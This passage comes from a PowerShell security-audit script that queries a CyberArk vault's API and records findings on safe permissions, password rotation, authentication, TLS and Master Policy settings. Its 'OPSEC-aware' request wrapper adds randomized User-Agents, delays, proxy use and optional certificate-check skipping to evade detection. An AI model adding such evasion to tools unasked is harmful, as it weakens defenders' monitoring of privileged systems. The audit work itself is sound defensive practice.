            $script:WebProxy.Credentials = $ProxyCredential
        }

        [System.Net.WebRequest]::DefaultWebProxy = $script:WebProxy
    }

    # Store custom User-Agent
    if ($UserAgent) {
        $script:CustomUserAgent = $UserAgent
    }
}

function Invoke-OPSECWebRequest {
    <#
    .SYNOPSIS
        OPSEC-aware web request wrapper with proxy, delay, and evasion support
    #>
    param(
        [Parameter(Mandatory = $true)]
        [string]$Uri,

        [string]$Method = "GET",

        [hashtable]$Headers = @{},

        [object]$Body = $null,

        [string]$ContentType = "application/json",

        [int]$TimeoutSec = 30,

        [switch]$ReturnFullResponse
    )

    # Add delay for OPSEC
    Add-RequestDelay

    # Build headers with User-Agent
    $requestHeaders = $Headers.Clone()
    if (-not $requestHeaders.ContainsKey("User-Agent")) {
        $requestHeaders["User-Agent"] = Get-RandomizedUserAgent
    }

    # Build request parameters
    $params = @{
        Uri             = $Uri
        Method          = $Method
        Headers         = $requestHeaders
        TimeoutSec      = $TimeoutSec
        UseBasicParsing = $true
        ErrorAction     = "SilentlyContinue"
    }

    if ($Body) {
        $params.Body = if ($Body -is [string]) { $Body } else { $Body | ConvertTo-Json -Depth 10 }
        $params.ContentType = $ContentType
    }

    # Add proxy if configured
    if ($script:WebProxy) {
        $params.Proxy = $script:WebProxy.Address
        if ($ProxyCredential) {
            $params.ProxyCredential = $ProxyCredential
        }
    }

    # Handle certificate validation for PS 6+
    if ($script:SkipCertCheck -and $PSVersionTable.PSVersion.Major -ge 6) {
        $params.SkipCertificateCheck = $true
    }

    try {
        $response = Invoke-WebRequest @params

        if ($ReturnFullResponse) {
            return $response
        }

        return @{
            StatusCode = $response.StatusCode
            Headers    = $response.Headers
            Content    = $response.Content
            Success    = $true
        }
    }
    catch {
        return @{
            StatusCode = if ($_.Exception.Response) { [int]$_.Exception.Response.StatusCode } else { 0 }
            Error      = $_.Exception.Message
            Success    = $false
        }
    }
}

function Clear-SensitiveData {
    <#
    .SYNOPSIS
        Securely clears sensitive data from memory
    #>
    param(
        [ref]$SecureString
    )

    if ($SecureString.Value -and $SecureString.Value -is [System.Security.SecureString]) {
        $SecureString.Value.Dispose()
    }

    # Force garbage collection for sensitive data
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()
}

function Write-AuditLog {
    param(
        [string]$Message,
        [ValidateSet("Info", "Warning", "Error", "Success")]
        [string]$Level = "Info"
    )

    # Respect quiet mode
    if ($QuietMode -and $Level -eq "Info") {
        return
    }

    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $color = switch ($Level) {
        "Info"    { "Cyan" }
        "Warning" { "Yellow" }
        "Error"   { "Red" }
        "Success" { "Green" }
    }

    Write-Host "[$timestamp] [$Level] $Message" -ForegroundColor $color
}

function Add-Finding {
    param(
        [string]$Category,
        [string]$CISControl,
        [string]$Finding,
        [string]$Resource,
        [string]$CurrentValue,
        [string]$ExpectedValue,
        [string]$Recommendation,
        [ValidateSet("Critical", "High", "Medium", "Low", "Info")]
        [string]$Severity,
        [ValidateSet("Fail", "Pass", "NotApplicable", "Error", "Skipped")]
        [string]$Status = "Fail"
    )

    $script:Findings += [PSCustomObject]@{
        Category       = $Category
        CISControl     = $CISControl
        CISDescription = $script:CISControls[$CISControl]
        Finding        = $Finding
        Resource       = $Resource
        CurrentValue   = $CurrentValue
        ExpectedValue  = $ExpectedValue
        Recommendation = $Recommendation
        Severity       = $Severity
        Status         = $Status
        Timestamp      = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    }
}

function Add-SkippedCheck {
    param(
        [string]$Category,
        [string]$CISControl,
        [string]$CheckName,
        [string]$Reason,
        [ValidateSet("NotApplicable", "Error", "Skipped", "AccessDenied", "Timeout")]
        [string]$Type = "Skipped"
    )

    $script:SkippedChecks += [PSCustomObject]@{
        Category       = $Category
        CISControl     = $CISControl
        CISDescription = $script:CISControls[$CISControl]
        CheckName      = $CheckName
        Reason         = $Reason
        Type           = $Type
        Timestamp      = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    }

    Write-AuditLog "Check skipped: $CheckName - $Reason" -Level Warning
}

function Invoke-CyberArkAPI {
    param(
        [string]$Endpoint,
        [string]$Method = "GET",
        [object]$Body = $null
    )

    $uri = "$PVWA/PasswordVault/api$Endpoint"
    $params = @{
        Uri         = $uri
        Method      = $Method
        Headers     = $script:Headers
        ContentType = "application/json"
        TimeoutSec  = $script:Config.TimeoutSeconds
    }

    if ($Body) {
        $params.Body = $Body | ConvertTo-Json -Depth 10
    }

    try {
        $response = Invoke-RestMethod @params
        return $response
    }
    catch {
        Write-AuditLog "API call failed: $Endpoint - $($_.Exception.Message)" -Level Warning
        return $null
    }
}
#endregion

#region Authentication
function Test-InteractiveSession {
    # Check if running in an interactive PowerShell session
    try {
        $psHost = Get-Host
        return $psHost.Name -ne 'Default Host' -and [Environment]::UserInteractive
    }
    catch {
        return $false
    }
}

function Connect-CyberArk {
    Write-AuditLog "Connecting to CyberArk PVWA: $PVWA" -Level Info

    if (-not $Credential) {
        if (Test-InteractiveSession) {
            try {
                $Credential = Get-Credential -Message "Enter CyberArk credentials for authenticated checks"
            }
            catch {
                Write-AuditLog "User cancelled credential prompt" -Level Warning
                return $false
            }
        }
        else {
            Write-AuditLog "No credentials provided and running non-interactively - skipping authenticated checks" -Level Warning
            return $false
        }
    }

    if (-not $Credential) {
        Write-AuditLog "No credentials available for authentication" -Level Warning
        return $false
    }

    $body = $null
    try {
        $body = @{
            username = $Credential.UserName
            password = $Credential.GetNetworkCredential().Password
        } | ConvertTo-Json

        $response = Invoke-RestMethod -Uri "$PVWA/PasswordVault/api/Auth/$AuthType/Logon" `
            -Method POST -Body $body -ContentType "application/json" -TimeoutSec 30

        $script:Headers = @{ Authorization = $response }
        Write-AuditLog "Successfully authenticated to CyberArk" -Level Success
        return $true
    }
    catch {
        Write-AuditLog "Authentication failed: $($_.Exception.Message)" -Level Error
        return $false
    }
    finally {
        # Securely clear sensitive credential data from memory
        if ($body) { 
            $body = $null 
        }
        Remove-Variable body -ErrorAction SilentlyContinue
        [System.GC]::Collect()
    }
}

function Disconnect-CyberArk {
    try {
        Invoke-RestMethod -Uri "$PVWA/PasswordVault/api/Auth/Logoff" -Method POST -Headers $script:Headers
        Write-AuditLog "Successfully logged off from CyberArk" -Level Success
    }
    catch {
        Write-AuditLog "Logoff failed: $($_.Exception.Message)" -Level Warning
    }
}
#endregion

#region Audit Functions

function Test-SafeConfigurations {
    Write-AuditLog "Auditing Safe configurations..." -Level Info

    $safes = Invoke-CyberArkAPI -Endpoint "/Safes?limit=$($script:Config.PageLimit)"
    if (-not $safes) {
        Add-SkippedCheck -Category "Safe Configuration" -CISControl "3.1" `
            -CheckName "Safe Configuration Audit" `
            -Reason "Could not retrieve safes from API - check permissions or connectivity" `
            -Type "Error"
        return
    }

    $script:AuditStats.TotalSafes = $safes.value.Count

    foreach ($safe in $safes.value) {
        $safeName = $safe.safeName

        # Skip system safes
        if ($safeName -match "^(System|Notification|VaultInternal|PasswordManager)") {
            continue
        }

        $safeDetails = Invoke-CyberArkAPI -Endpoint "/Safes/$safeName"
        if (-not $safeDetails) { continue }

        # Check: Version retention
        if ($safeDetails.numberOfVersionsRetention -lt $script:Config.MinVersionRetention) {
            Add-Finding -Category "Safe Configuration" `
                -CISControl "3.1" `
                -Finding "Insufficient version retention" `
                -Resource $safeName `
                -CurrentValue $safeDetails.numberOfVersionsRetention `
                -ExpectedValue "$($script:Config.MinVersionRetention)+" `
                -Recommendation "Increase version retention to minimum $($script:Config.MinVersionRetention)" `
                -Severity "Medium"
        }

        # Check: No description (governance issue)
        if ([string]::IsNullOrWhiteSpace($safeDetails.description)) {
            Add-Finding -Category "Safe Configuration" `
                -CISControl "3.1" `
                -Finding "Safe has no description" `
                -Resource $safeName `
                -CurrentValue "(empty)" `
                -ExpectedValue "Descriptive text" `
                -Recommendation "Add description for governance tracking" `
                -Severity "Low"
        }

        # Audit safe members
        try { Test-SafeMembers -SafeName $safeName } catch { Write-AuditLog "Error auditing members for safe $safeName : $($_.Exception.Message)" -Level Warning }
    }
}

function Test-SafeMembers {
    param([string]$SafeName)

    $members = Invoke-CyberArkAPI -Endpoint "/Safes/$SafeName/Members"
    if (-not $members) { return }

    $adminCount = 0
    $fullAccessUsers = @()

    foreach ($member in $members.value) {
        $perms = $member.permissions
        $memberName = $member.memberName
        $memberType = $member.memberType

        # Check: Users with full administrative rights
        if ($perms.manageSafe -and $perms.manageSafeMembers) {
            $adminCount++
            if ($memberType -eq "User") {
                $fullAccessUsers += $memberName
            }
        }

        # Check: Overly permissive individual user access
        if ($memberType -eq "User") {
            $highPrivPerms = @()
            if ($perms.manageSafe) { $highPrivPerms += "ManageSafe" }
            if ($perms.manageSafeMembers) { $highPrivPerms += "ManageSafeMembers" }
            if ($perms.backupSafe) { $highPrivPerms += "BackupSafe" }
            if ($perms.requestsAuthorizationLevel1) { $highPrivPerms += "AuthLevel1" }
            if ($perms.requestsAuthorizationLevel2) { $highPrivPerms += "AuthLevel2" }

            if ($highPrivPerms.Count -ge 3) {
                Add-Finding -Category "Access Control" `
                    -CISControl "3.2" `
                    -Finding "User with excessive safe permissions" `
                    -Resource "$SafeName : $memberName" `
                    -CurrentValue ($highPrivPerms -join ", ") `
                    -ExpectedValue "Least privilege" `
                    -Recommendation "Review and reduce permissions; use groups instead" `
                    -Severity "High"
            }
        }

        # Check: Permission to retrieve without audit
        if ($perms.retrieveAccounts -and -not $perms.viewAuditLog) {
            Add-Finding -Category "Access Control" `
                -CISControl "3.2" `
                -Finding "Retrieve permission without audit log access" `
                -Resource "$SafeName : $memberName" `
                -CurrentValue "Retrieve=Yes, ViewAudit=No" `
                -ExpectedValue "Audit visibility for accountability" `
                -Recommendation "Consider granting ViewAuditLog permission" `
                -Severity "Low"
        }
    }

    # Check: Too many administrators per safe
    if ($adminCount -gt 3) {
        Add-Finding -Category "Access Control" `
            -CISControl "3.2" `
            -Finding "Excessive safe administrators" `
            -Resource $SafeName `
            -CurrentValue "$adminCount admins" `
            -ExpectedValue "2-3 admins maximum" `
            -Recommendation "Reduce number of safe administrators" `
            -Severity "Medium"
    }

    # Check: Individual users instead of groups as admins
    if ($fullAccessUsers.Count -gt 0) {
        Add-Finding -Category "Access Control" `
            -CISControl "3.2" `
            -Finding "Individual users as safe administrators" `
            -Resource $SafeName `
            -CurrentValue ($fullAccessUsers -join ", ") `
            -ExpectedValue "AD/LDAP groups for administration" `
            -Recommendation "Use groups instead of individual users for safe administration" `
            -Severity "Medium"
    }
}

function Test-AccountConfigurations {
    Write-AuditLog "Auditing Account configurations..." -Level Info

    $accounts = Invoke-CyberArkAPI -Endpoint "/Accounts?limit=$($script:Config.PageLimit)"
    if (-not $accounts) {
        Add-SkippedCheck -Category "Credential Management" -CISControl "4.1" `
            -CheckName "Account Configuration Audit" `
            -Reason "Could not retrieve accounts from API - check permissions or connectivity" `
            -Type "Error"
        return
    }

    $script:AuditStats.TotalAccounts = $accounts.value.Count
    $now = Get-Date

    # Track accounts per safe for orphan detection
    $safesWithAccounts = @{}

    foreach ($account in $accounts.value) {
        $accountName = $account.name
        $safeName = $account.safeName
        $platformId = $account.platformId

        # Track safes with accounts
        if (-not $safesWithAccounts.ContainsKey($safeName)) {
            $safesWithAccounts[$safeName] = 0
        }
        $safesWithAccounts[$safeName]++

        # Check: Automatic management disabled
        if ($account.secretManagement.automaticManagementEnabled -eq $false) {
            $script:AuditStats.UnmanagedAccounts++

            $reason = $account.secretManagement.manualManagementReason
            Add-Finding -Category "Credential Management" `
                -CISControl "4.1" `
                -Finding "Automatic password management disabled" `
                -Resource "$safeName/$accountName" `
                -CurrentValue "Disabled - Reason: $reason" `
                -ExpectedValue "Enabled" `
                -Recommendation "Enable automatic management or document exception" `
                -Severity "High"
        }

        # Check: Password age
        $lastModified = $account.secretManagement.lastModifiedTime
        if ($lastModified) {
            try {
                $lastModifiedDate = [DateTime]::Parse($lastModified)
                $passwordAge = ($now - $lastModifiedDate).Days

                if ($passwordAge -gt $script:Config.MaxPasswordAgeDays) {
                    Add-Finding -Category "Credential Hygiene" `
                        -CISControl "4.2" `
                        -Finding "Password exceeds maximum age" `
                        -Resource "$safeName/$accountName" `
                        -CurrentValue "$passwordAge days" `
                        -ExpectedValue "$($script:Config.MaxPasswordAgeDays) days maximum" `
                        -Recommendation "Investigate CPM rotation; force password change" `
                        -Severity "High"
                }
                elseif ($passwordAge -gt ($script:Config.MaxPasswordAgeDays * 0.75)) {
                    Add-Finding -Category "Credential Hygiene" `
                        -CISControl "4.2" `
                        -Finding "Password approaching maximum age" `
                        -Resource "$safeName/$accountName" `
                        -CurrentValue "$passwordAge days" `
                        -ExpectedValue "$($script:Config.MaxPasswordAgeDays) days maximum" `
                        -Recommendation "Verify rotation schedule" `
                        -Severity "Medium"
                }
            }
            catch {
                # Unable to parse date
            }
        }

        # Check: Account status issues
        $status = $account.secretManagement.status
        if ($status -and $status -ne "success") {
            Add-Finding -Category "Credential Management" `
                -CISControl "4.1" `
                -Finding "Account has management issues" `
                -Resource "$safeName/$accountName" `
                -CurrentValue "Status: $status" `
                -ExpectedValue "Status: success" `
                -Recommendation "Investigate and resolve CPM errors" `
                -Severity "High"
        }

        # Check: Missing reconcile account
        if (-not $account.secretManagement.lastReconciledTime -and $account.secretManagement.automaticManagementEnabled) {
            # Only flag if it's been managed for a while
        }

        # Check: Privileged account indicators without proper platform
        $userName = $account.userName
        if ($userName -match "(admin|root|sa|dba|svc_|service)" -and $platformId -notmatch "(Privileged|Admin|Service)") {
            Add-Finding -Category "Account Classification" `
                -CISControl "4.1" `
                -Finding "Potential privileged account on basic platform" `
                -Resource "$safeName/$accountName ($userName)" `
                -CurrentValue "Platform: $platformId" `
                -ExpectedValue "Privileged-specific platform" `
                -Recommendation "Verify correct platform assignment for privileged accounts" `
                -Severity "Medium"
        }
    }

    $script:SafesWithAccounts = $safesWithAccounts
}

function Test-PlatformConfigurations {
    Write-AuditLog "Auditing Platform configurations..." -Level Info

    $platforms = Invoke-CyberArkAPI -Endpoint "/Platforms"
    if (-not $platforms) {
        Add-SkippedCheck -Category "Platform Configuration" -CISControl "2.4" `
            -CheckName "Platform Configuration Audit" `
            -Reason "Could not retrieve platforms from API - check permissions" `
            -Type "Error"
        return
    }

    foreach ($platform in $platforms.Platforms) {
        $platformId = $platform.PlatformID
        $platformName = $platform.Name
        $active = $platform.Active

        # Skip inactive platforms
        if (-not $active) { continue }

        # Get detailed platform info
        $details = Invoke-CyberArkAPI -Endpoint "/Platforms/$platformId"
        if (-not $details) { continue }

        # Check platform-specific settings where available
        $credentialsManagement = $details.Details.CredentialsManagementPolicy

        if ($credentialsManagement) {
            # Check: Password change interval
            $changeEveryDays = $credentialsManagement.ChangeEveryDays
            if ($changeEveryDays -and $changeEveryDays -gt $script:Config.MaxPasswordAgeDays) {
                Add-Finding -Category "Platform Configuration" `
                    -CISControl "2.4" `
                    -Finding "Password change interval too long" `
                    -Resource "Platform: $platformName" `
                    -CurrentValue "$changeEveryDays days" `
                    -ExpectedValue "$($script:Config.MaxPasswordAgeDays) days or less" `
                    -Recommendation "Reduce password change interval" `
                    -Severity "Medium"
            }

            # Check: Verification interval
            $verifyEveryDays = $credentialsManagement.VerifyEveryDays
            if ($verifyEveryDays -and $verifyEveryDays -gt 7) {
                Add-Finding -Category "Platform Configuration" `
                    -CISControl "4.1" `
                    -Finding "Password verification interval too long" `
                    -Resource "Platform: $platformName" `
                    -CurrentValue "$verifyEveryDays days" `
                    -ExpectedValue "7 days or less" `
                    -Recommendation "Increase verification frequency" `
                    -Severity "Low"
            }
        }
    }
}

function Test-UserConfigurations {
    Write-AuditLog "Auditing User configurations..." -Level Info

    $users = Invoke-CyberArkAPI -Endpoint "/Users?ExtendedDetails=true"
    if (-not $users) {
        Add-SkippedCheck -Category "User Management" -CISControl "5.1" `
            -CheckName "User Configuration Audit" `
            -Reason "Could not retrieve users from API - check permissions" `
            -Type "Error"
        return
    }

    $script:AuditStats.TotalUsers = $users.Users.Count
    $now = Get-Date

    foreach ($user in $users.Users) {
        $userName = $user.username
        $userType = $user.userType

        # Skip built-in system users
        if ($userName -match "^(Administrator|Master|Batch|DR_|Backup)") {
            continue
        }

        # Check: Disabled users
        if ($user.enableUser -eq $false) {
            Add-Finding -Category "User Management" `
                -CISControl "5.1" `
                -Finding "Disabled user account exists" `
                -Resource $userName `
                -CurrentValue "Disabled" `
                -ExpectedValue "Removed or documented" `
                -Recommendation "Remove disabled accounts or document retention reason" `
                -Severity "Low"
        }

        # Check: Suspended users
        if ($user.suspended) {
            Add-Finding -Category "User Management" `
                -CISControl "5.1" `
                -Finding "Suspended user account" `
                -Resource $userName `
                -CurrentValue "Suspended" `
                -ExpectedValue "Active or removed" `
                -Recommendation "Investigate suspension and resolve or remove" `
                -Severity "Medium"
        }

        # Check: Users with vault authorization
        if ($user.vaultAuthorization) {
            $vaultPerms = $user.vaultAuthorization
            $highPerms = @()

            if ($vaultPerms -contains "AddUpdateUsers") { $highPerms += "AddUpdateUsers" }
            if ($vaultPerms -contains "AddSafes") { $highPerms += "AddSafes" }
            if ($vaultPerms -contains "AddNetworkAreas") { $highPerms += "AddNetworkAreas" }
            if ($vaultPerms -contains "ManageServerFileCategories") { $highPerms += "ManageServerFileCategories" }
            if ($vaultPerms -contains "AuditUsers") { $highPerms += "AuditUsers" }
            if ($vaultPerms -contains "BackupAllSafes") { $highPerms += "BackupAllSafes" }
            if ($vaultPerms -contains "RestoreAllSafes") { $highPerms += "RestoreAllSafes" }

            if ($highPerms.Count -ge 3 -and $userType -ne "Built-InAdmins") {
                Add-Finding -Category "User Management" `
                    -CISControl "3.2" `
                    -Finding "User with extensive vault-level permissions" `
                    -Resource $userName `
                    -CurrentValue ($highPerms -join ", ") `
                    -ExpectedValue "Minimal vault permissions" `
                    -Recommendation "Review vault-level permissions; apply least privilege" `
                    -Severity "High"
            }
        }

        # Check: Authentication method (CyberArk-only auth without MFA risk)
        $authMethod = $user.authenticationMethod
        if ($authMethod) {
            foreach ($method in $authMethod) {
                if ($method -eq "AuthTypePass" -and $authMethod.Count -eq 1) {
                    Add-Finding -Category "Authentication" `
                        -CISControl "5.1" `
                        -Finding "User relies solely on password authentication" `
                        -Resource $userName `
                        -CurrentValue "Password only" `
                        -ExpectedValue "MFA or directory authentication" `
                        -Recommendation "Enable additional authentication factor" `
                        -Severity "Medium"
                }
            }
        }

        # Check: Last login (stale accounts)
        if ($user.lastSuccessfulLoginDate) {
            try {
                $lastLogin = [DateTime]::Parse($user.lastSuccessfulLoginDate)
                $daysSinceLogin = ($now - $lastLogin).Days

                if ($daysSinceLogin -gt 90 -and $user.enableUser) {
                    Add-Finding -Category "User Management" `
                        -CISControl "5.1" `
                        -Finding "Stale user account (no login in 90+ days)" `
                        -Resource $userName `
                        -CurrentValue "$daysSinceLogin days since last login" `
                        -ExpectedValue "Regular activity or disabled" `
                        -Recommendation "Disable or remove inactive accounts" `
                        -Severity "Medium"
                }
            }
            catch { }
        }
    }
}

function Test-AuthenticationMethods {
    Write-AuditLog "Auditing Authentication Methods..." -Level Info

    $authMethods = Invoke-CyberArkAPI -Endpoint "/Configuration/AuthenticationMethods"
    if (-not $authMethods) {
        Add-SkippedCheck -Category "Authentication" -CISControl "5.1" `
            -CheckName "Authentication Methods Audit" `
            -Reason "Could not retrieve authentication configuration - may require admin permissions" `
            -Type "AccessDenied"
        return
    }

    foreach ($method in $authMethods.Methods) {
        $methodId = $method.id
        $methodName = $method.displayName
        $enabled = $method.enabled

        if (-not $enabled) { continue }

        # Check: CyberArk auth without MFA
        if ($methodId -eq "CyberArk") {
            if (-not $method.secondFactorAuth) {
                Add-Finding -Category "Authentication" `
                    -CISControl "5.1" `
                    -Finding "Built-in authentication without MFA" `
                    -Resource "Authentication: $methodName" `
                    -CurrentValue "No second factor" `
                    -ExpectedValue "MFA enabled or method disabled" `
                    -Recommendation "Enable second factor or disable CyberArk-native auth" `
                    -Severity "High"
            }
        }

        # Check: LDAP configuration
        if ($methodId -eq "LDAP") {
            if (-not $method.useSSL) {
                Add-Finding -Category "Authentication" `
                    -CISControl "5.2" `
                    -Finding "LDAP not using SSL/TLS" `
                    -Resource "Authentication: $methodName" `
                    -CurrentValue "SSL disabled" `
                    -ExpectedValue "LDAPS or LDAP with TLS" `
                    -Recommendation "Enable SSL for LDAP connections" `
                    -Severity "Critical"
            }
        }

        # Check: RADIUS timeout/retries
        if ($methodId -eq "RADIUS") {
            if ($method.timeout -and $method.timeout -gt 60) {
                Add-Finding -Category "Authentication" `
                    -CISControl "5.1" `
                    -Finding "RADIUS timeout too long" `
                    -Resource "Authentication: $methodName" `
                    -CurrentValue "$($method.timeout) seconds" `
                    -ExpectedValue "30-60 seconds" `
                    -Recommendation "Reduce RADIUS timeout" `
                    -Severity "Low"
            }
        }
    }
}

function Test-ComponentHealth {
    Write-AuditLog "Auditing Component Health..." -Level Info

    $components = Invoke-CyberArkAPI -Endpoint "/ComponentsMonitoringDetails/all"
    if (-not $components) {
        Add-SkippedCheck -Category "System Health" -CISControl "7.3" `
            -CheckName "Component Health Check" `
            -Reason "Could not retrieve component monitoring details - check permissions" `
            -Type "Error"
        return
    }

    foreach ($component in $components.Components) {
        $componentName = $component.ComponentName
        $componentType = $component.ComponentType
        $isLoggedOn = $component.IsLoggedOn
        $lastLogon = $component.LastLogonDate

        # Check: Component not logged on
        if (-not $isLoggedOn) {
            Add-Finding -Category "System Health" `
                -CISControl "7.3" `
                -Finding "Component not connected" `
                -Resource "$componentType : $componentName" `
                -CurrentValue "Disconnected" `
                -ExpectedValue "Connected" `
                -Recommendation "Investigate component connectivity" `
                -Severity "Critical"
        }

        # Check component-specific settings
        switch ($componentType) {
            "CPM" {
                # CPM-specific checks
            }
            "PSM" {
                # PSM-specific checks
            }
            "PVWA" {
                # PVWA-specific checks
            }
        }
    }
}

function Test-SystemConfiguration {
    Write-AuditLog "Auditing System Configuration..." -Level Info

    # Check: Server configuration (where available via API)
    $serverConfig = Invoke-CyberArkAPI -Endpoint "/Configuration/Server"

    if ($serverConfig) {
        # Check various server settings
    }

    # Check: PVWA configuration
    $pvwaConfig = Invoke-CyberArkAPI -Endpoint "/Configuration/PVWA"

    if ($pvwaConfig) {
        # Session timeout check
        if ($pvwaConfig.sessionTimeout -and $pvwaConfig.sessionTimeout -gt $script:Config.SessionTimeoutMinutes) {
            Add-Finding -Category "Web Security" `
                -CISControl "5.3" `
                -Finding "Session timeout too long" `
                -Resource "PVWA Configuration" `
                -CurrentValue "$($pvwaConfig.sessionTimeout) minutes" `
                -ExpectedValue "$($script:Config.SessionTimeoutMinutes) minutes or less" `
                -Recommendation "Reduce session timeout" `
                -Severity "Medium"
        }
    }
}

function Test-OrphanedSafes {
    Write-AuditLog "Checking for orphaned safes..." -Level Info

    $allSafes = Invoke-CyberArkAPI -Endpoint "/Safes?limit=$($script:Config.PageLimit)"
    if (-not $allSafes -or -not $script:SafesWithAccounts) { return }

    foreach ($safe in $allSafes.value) {
        $safeName = $safe.safeName

        # Skip system safes
        if ($safeName -match "^(System|Notification|VaultInternal|PasswordManager|PVWAConfig|PVWAReports|PVWATicket|PVWATask|AccountsFeed|PSM)") {
            continue
        }

        if (-not $script:SafesWithAccounts.ContainsKey($safeName)) {
            Add-Finding -Category "Safe Configuration" `
                -CISControl "3.1" `
                -Finding "Safe contains no accounts" `
                -Resource $safeName `
                -CurrentValue "0 accounts" `
                -ExpectedValue "Active use or removed" `
                -Recommendation "Remove unused safes or document purpose" `
                -Severity "Low"
        }
    }
}

function Test-TLSConfiguration {
    Write-AuditLog "Checking TLS configuration..." -Level Info

    # This requires external connectivity test
    try {
        $uri = [System.Uri]$PVWA
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $tcpClient.Connect($uri.Host, $uri.Port)

        $sslStream = New-Object System.Net.Security.SslStream($tcpClient.GetStream(), $false)
        $sslStream.AuthenticateAsClient($uri.Host)

        $tlsVersion = $sslStream.SslProtocol
        $cipherAlgorithm = $sslStream.CipherAlgorithm
        $keyExchangeAlgorithm = $sslStream.KeyExchangeAlgorithm
        $hashAlgorithm = $sslStream.HashAlgorithm

        # Log successful TLS check
        Add-Finding -Category "Transport Security" `
            -CISControl "8.1" `
            -Finding "TLS Configuration" `
            -Resource "PVWA" `
            -CurrentValue "TLS $tlsVersion, Cipher: $cipherAlgorithm" `
            -ExpectedValue "TLS 1.2+" `
            -Recommendation "N/A" `
            -Severity "Info" `
            -Status "Pass"

        # Check for weak TLS
        if ($tlsVersion -match "Tls11|Tls10|Ssl") {
            Add-Finding -Category "Transport Security" `
                -CISControl "8.1" `
                -Finding "Weak TLS version in use" `
                -Resource "PVWA" `
                -CurrentValue $tlsVersion `
                -ExpectedValue "TLS 1.2 or higher" `
                -Recommendation "Disable TLS 1.0/1.1 and SSLv3" `
                -Severity "Critical"
        }

        $sslStream.Close()
        $tcpClient.Close()
    }
    catch {
        Add-SkippedCheck -Category "Transport Security" -CISControl "8.1" `
            -CheckName "TLS Configuration Check" `
            -Reason "Could not test TLS configuration: $($_.Exception.Message)" `
            -Type "Error"
    }
}

#======================================================================
# VENDOR BEST PRACTICE AUDIT FUNCTIONS
#======================================================================

function Test-MasterPolicy {
    Write-AuditLog "Auditing Master Policy settings (Vendor Best Practices)..." -Level Info

    # Get Master Policy via Platforms endpoint (platform ID 0 or MasterPolicy)
    $masterPolicy = Invoke-CyberArkAPI -Endpoint "/Platforms/MasterPolicy"

    if (-not $masterPolicy) {
        # Try alternative endpoint
        $masterPolicy = Invoke-CyberArkAPI -Endpoint "/Configuration/MasterPolicy"
    }

    if (-not $masterPolicy) {
        Add-SkippedCheck -Category "Master Policy" -CISControl "V1.1" `
            -CheckName "Master Policy Audit" `
            -Reason "Could not retrieve Master Policy - may require elevated permissions" `
            -Type "AccessDenied"
        return
    }

    $details = $masterPolicy.Details

    # Check: Minimum validity period
    if ($details.MinValidityPeriod -and $details.MinValidityPeriod -lt $script:Config.MinValidityPeriod) {
        Add-Finding -Category "Master Policy" `
            -CISControl "V1.1" `
            -Finding "Minimum validity period too short" `
            -Resource "Master Policy" `
            -CurrentValue "$($details.MinValidityPeriod) minutes" `
            -ExpectedValue "$($script:Config.MinValidityPeriod)+ minutes" `
            -Recommendation "Increase MinValidityPeriod to prevent rapid credential cycling" `
            -Severity "Medium"
    }

    # Check: One-time password access
    if ($details.EnforceOnetimePasswordAccess -eq $false) {
        Add-Finding -Category "Master Policy" `
            -CISControl "V1.2" `
            -Finding "One-time password access not enforced" `
            -Resource "Master Policy" `
            -CurrentValue "Disabled" `
            -ExpectedValue "Enabled for sensitive accounts" `
            -Recommendation "Enable one-time password access for high-risk accounts" `
            -Severity "Medium"
    }

    # Check: Exclusive access enforcement
    if ($details.EnforceCheckinCheckoutExclusiveAccess -eq $false) {
        Add-Finding -Category "Master Policy" `
            -CISControl "V1.3" `
            -Finding "Exclusive access not enforced" `
            -Resource "Master Policy" `
            -CurrentValue "Disabled" `
            -ExpectedValue "Enabled" `
            -Recommendation "Enable exclusive access to prevent concurrent credential use" `
            -Severity "High"
    }

    # Check: Reset overrides minimum validity
    if ($details.ResetOverridesMinValidity -eq $true) {
        Add-Finding -Category "Master Policy" `
            -CISControl "V1.4" `
            -Finding "Reset overrides minimum validity enabled" `
            -Resource "Master Policy" `
            -CurrentValue "Enabled" `
            -ExpectedValue "Disabled" `
            -Recommendation "Disable to prevent bypassing minimum validity period" `
            -Severity "Medium"
    }

    # Check: Allow unmanaged access
    if ($details.AllowUnmanagedAccess -eq $true) {
        Add-Finding -Category "Master Policy" `
            -CISControl "2.1" `
            -Finding "Unmanaged access allowed" `
            -Resource "Master Policy" `
            -CurrentValue "Enabled" `
            -ExpectedValue "Disabled" `
            -Recommendation "Disable unmanaged access to enforce password management" `
            -Severity "High"
    }

    # Check: Require dual control for password access approval
    if ($details.RequireDualControlPasswordAccessApproval -eq $false -and $script:Config.RequireDualControlForSensitive) {
        Add-Finding -Category "Master Policy" `
            -CISControl "3.3" `
            -Finding "Dual control not required for password access" `
            -Resource "Master Policy" `
            -CurrentValue "Disabled" `
            -ExpectedValue "Enabled for sensitive safes" `
            -Recommendation "Enable dual control for sensitive account access" `
            -Severity "Medium"
    }

    # Check: Password history retention
    if ($details.PasswordHistoryToKeep -and $details.PasswordHistoryToKeep -lt 5) {
        Add-Finding -Category "Master Policy" `
            -CISControl "2.1" `
            -Finding "Insufficient password history retention" `
            -Resource "Master Policy" `
            -CurrentValue "$($details.PasswordHistoryToKeep) versions" `
            -ExpectedValue "5+ versions" `
            -Recommendation "Increase password history retention" `
            -Severity "Low"
    }
}

function Test-PSMConfiguration {
    Write-AuditLog "Auditing PSM Configuration (Vendor Best Practices)..." -Level Info

    # Get PSM servers
    $components = Invoke-CyberArkAPI -Endpoint "/ComponentsMonitoringDetails/all"
    $psmServers = $components.Components | Where-Object { $_.ComponentType -eq "PSM" }

    if (-not $psmServers) {
        Add-SkippedCheck -Category "PSM Configuration" -CISControl "V2.1" `
            -CheckName "PSM Server Audit" `
            -Reason "No PSM servers found in component monitoring - PSM may not be deployed" `
            -Type "NotApplicable"
        return
    }

    foreach ($psm in $psmServers) {
        $psmName = $psm.ComponentName

        # Check PSM server is connected
        if (-not $psm.IsLoggedOn) {
            Add-Finding -Category "PSM Configuration" `
                -CISControl "V2.1" `
                -Finding "PSM server not connected" `
                -Resource $psmName `
                -CurrentValue "Disconnected" `
                -ExpectedValue "Connected" `
                -Recommendation "Investigate PSM connectivity immediately" `
                -Severity "Critical"
        }
    }

    # Check PSM Recording settings via Configuration API
    $psmConfig = Invoke-CyberArkAPI -Endpoint "/Configuration/PSM"

